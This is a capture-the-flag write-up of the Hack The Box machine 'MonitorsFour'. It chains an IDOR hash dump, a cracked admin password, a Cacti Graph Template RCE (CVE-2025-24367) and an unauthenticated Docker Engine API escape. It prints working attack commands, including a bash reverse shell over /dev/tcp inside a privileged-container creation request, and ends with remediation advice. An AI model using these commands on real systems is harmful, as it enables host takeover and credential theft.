## Summary

MonitorsFour is an Easy machine running Linux containers on a Windows host
(Docker Desktop / WSL2). An **IDOR** on `/user?token=0` dumps the user table with
MD5 hashes; cracking the admin hash gives `marcus:wonderful1`, which logs into a
hidden **Cacti 1.2.28** subdomain. A Cacti Graph Template RCE (CVE-2025-24367)
provides a shell inside a container, and an unauthenticated **Docker Engine API**
(CVE-2025-9074) on the internal subnet is abused to launch a privileged container
that mounts the host and reads **root.txt** from the Windows `C:` drive.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| MonitorsFour | Easy | Windows | Hack The Box |

## Attack Path

1. Nmap reveals nginx (HTTP) and WinRM.
2. The `/user` endpoint is discovered via fuzzing.
3. An IDOR (`token=0`) dumps the full user table.
4. The admin MD5 hash is cracked (`wonderful1`).
5. VHost fuzzing finds `cacti.monitorsfour.htb`.
6. Login to Cacti 1.2.28 as `marcus:wonderful1`.
7. Cacti Graph Template RCE (CVE-2025-24367) yields a container shell as `www-data`.
8. The environment is identified as Docker Desktop + WSL2.
9. The internal subnet is scanned for the Docker API.
10. The unauthenticated Docker API (CVE-2025-9074) is abused.
11. A privileged container with a `/` bind mount is created.
12. A root shell reads `root.txt` from the Windows `C:` drive.

## Reconnaissance

Initial enumeration was performed with **Nmap**.

```bash
nmap -sC -sV -A -T4 10.129.59.22
```

| Port | Service | Notes |
| --- | --- | --- |
| 80 | HTTP | nginx, redirects to `monitorsfour.htb` |
| 5985 | WinRM | Microsoft HTTPAPI httpd 2.0 |

The combination of nginx + WinRM was the first hint of containers on a Windows
host. The hostnames were added to `/etc/hosts`.

## Web Enumeration

`http://monitorsfour.htb` was a corporate site with a standard login form and no
default credentials. Directory fuzzing with `ffuf`:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://monitorsfour.htb/FUZZ -mc 200
```

The tiny `/user` response (35 bytes) stood out:

```
curl http://monitorsfour.htb/user
{"error":"Missing token parameter"}
```

## Exploitation — IDOR on /user

Common token values failed, but the edge-case value `0` returned the entire user
table, including MD5 password hashes.

```bash
curl -X GET 'http://monitorsfour.htb/user?token=0'
```

```json
[
  {"id":2,"username":"admin","password":"56b32eb43e6f15395f6c46c1c9e1cd36","name":"Marcus Higgins"},
  {"id":5,"username":"mwatson","password":"69196959c16b26ef00b77d82cf6eb169"},
  {"id":6,"username":"janderson","password":"2a22dcf99190c322d974c8df5ba3256b"},
  {"id":7,"username":"dthompson","password":"8d4a7e7fd08555133e056d9aacb1e519"}
]
```

Only the admin hash cracked (via CrackStation):

```
56b32eb43e6f15395f6c46c1c9e1cd36 → wonderful1
```

The admin's display name was **Marcus Higgins**, hinting that the real username
might be `marcus`.

## Subdomain Enumeration

VHost fuzzing revealed a hidden subdomain:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -ac
```

```
cacti  [Status: 302]
```

`cacti.monitorsfour.htb` hosted a **Cacti 1.2.28** login. The direct
`admin:wonderful1` failed, but `marcus:wonderful1` worked — applications often
accept the first name as an alternate login.

## Cacti Graph Template RCE (CVE-2025-24367)

Cacti 1.2.28 is vulnerable to CVE-2025-24367, a post-auth RCE that abuses Graph
Templates to write and execute a PHP file in the webroot. Using the public PoC:

```bash
nc -lvnp 1337
sudo python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p wonderful1 -i 10.10.14.228 -l 1337
```

The listener received a shell:

```
www-data@821fbd6a43fa:~/html/cacti$
```

The 12-char hostname (`821fbd6a43fa`) indicated a **Docker container**. The
`user.txt` was world-readable in `/home/marcus` inside this container.

## Privilege Escalation

### Identifying the environment

```bash
ip addr   # eth0 on 172.18.0.0/16 (Docker bridge)
ls -la /.dockerenv   # present
```

The bridge network and `/.dockerenv` confirmed a container. Since Nmap suggested
Windows + WinRM but the shell was Linux, the host was **Docker Desktop on WSL2**.
Probing `host.docker.internal` revealed the Docker Desktop subnet
`192.168.65.0/24`.

### Locating the Docker API (CVE-2025-9074)

CVE-2025-9074 lets Linux containers reach the Docker Engine API on the internal
subnet **without authentication** on port 2375. Scanning the subnet:

```bash
for i in $(seq 1 254); do
  (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2>/dev/null \
   | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") &
done; wait
```

```
192.168.65.7:2375 OPEN
```

### Enumerating the Docker API

```bash
curl http://192.168.65.7:2375/version
```

The `KernelVersion` (`...microsoft-standard-WSL2`) confirmed WSL2. Listing
containers exposed Compose labels with the host path:

```
"com.docker.compose.project.working_dir": "C:\\Users\\Administrator\\Documents\\docker_setup"
```

This confirmed a Windows host with an `Administrator` user — so the root flag
would be on the Windows desktop.

### Container escape (privileged + bind mount)

With full unauthenticated API access, a privileged container was created with
the host root bind-mounted:

```bash
nc -lvnp 4449
```

```bash
curl -X POST -H "Content-Type: application/json" \
  http://192.168.65.7:2375/containers/create \
  -d '{
    "Image": "docker_setup-nginx-php",
    "Cmd": ["/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.228/4449 0>&1"],
    "HostConfig": {"Binds": ["/:/host"], "Privileged": true},
    "Tty": true, "AttachStdin": true, "AttachStdout": true, "AttachStderr": true, "OpenStdin": true
  }'
```

```bash
curl -X POST http://192.168.65.7:2375/containers/<id>/start
```

```
root@4efc88a6fae2:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

The Windows `C:` drive is reachable through the bind mount, and the root flag is
read from `C:\Users\Administrator\Desktop\root.txt`:

```bash
cat /host/mnt/host/c/Users/Administrator/Desktop/root.txt
```

## Vulnerability Analysis

**IDOR on `/user`** — `/user?token=0` returned the full user table with hashes
and no authentication. Fix: enforce authentication/authorization on the endpoint
and reject sentinel values like `0`.

**Unsalted MD5 hashes** — passwords were stored as unsalted MD5, trivially
cracked with rainbow tables. Fix: store passwords with a slow, salted algorithm
(bcrypt/argon2).

**Cacti RCE (CVE-2025-24367)** — Cacti 1.2.28 was unpatched and allowed
authenticated RCE via Graph Templates, giving a container shell as `www-data`.
Fix: upgrade Cacti and restrict template editing privileges.

**Unauthenticated Docker API (CVE-2025-9074)** — the Docker Engine API was
reachable from any container on the internal subnet without TLS or auth,
enabling full host compromise via a privileged bind-mounted container. Fix: never
expose the Docker socket/API without authentication and TLS, and isolate the
container network.

**Information disclosure via Compose labels** — `/containers/json` leaked absolute
Windows host paths, revealing the OS and admin user. Fix: avoid embedding
sensitive paths in labels and restrict API read access.

## Tools Used

- Nmap
- ffuf (directory + vhost fuzzing)
- curl
- CrackStation
- CVE-2025-24367 Cacti PoC
- Netcat
- Docker Engine API

## Key Takeaways

- IDOR with `0` is a classic blind spot — always test edge values (`0`, `-1`, `null`, empty).
- Username ≠ login name; try the first name or display name when the direct username fails.
- A short hex hostname plus `/.dockerenv` is a definitive container indicator.
- Nmap saying Windows while your shell is Linux usually means Docker Desktop on WSL2.
- An unauthenticated Docker API on the internal subnet is full host compromise, not just container access.
- Compose labels can leak absolute host paths, the OS and the admin user for free.
